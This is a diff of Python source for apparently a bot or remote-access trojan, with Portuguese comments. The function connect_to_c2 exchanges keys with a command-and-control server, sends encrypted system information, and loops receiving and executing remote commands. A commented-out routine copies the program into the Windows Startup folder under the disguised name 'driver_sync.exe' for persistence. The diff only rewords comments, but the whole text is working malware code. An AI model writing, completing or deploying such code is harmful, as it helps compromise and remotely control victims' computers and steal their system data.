@@ -24,17 +24,17 @@ def connect_to_c2():
         print(f"[!] Failed to load server public key: {e}")
         return
 
-    # Envia o tamanho da chave e a chave pública
+    # Envia sua chave pública diretamente
     bot.send(public_bytes)
 
-    # Deriva a chave compartilhada
+    # Deriva a chave de sessão compartilhada
     session_key = key_exchange.generate_shared_key(private_key, server_public_key)
 
-    # Envia informações do sistema
+    # Envia informações do sistema criptografadas
     info = commands.get_info()
     bot.send(aes_crypto.encrypt(info, session_key))
 
-    # Loop principal
+    # Loop principal para execução de comandos remotos
     while True:
         try:
             command = aes_crypto.decrypt(bot.recv(1024), session_key)
@@ -51,7 +51,6 @@ def connect_to_c2():
 
     bot.close()
 
-# === Persistência desativada para testes ===
 # def persist():
 #     startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 #     target_path = os.path.join(startup_path, "driver_sync.exe")
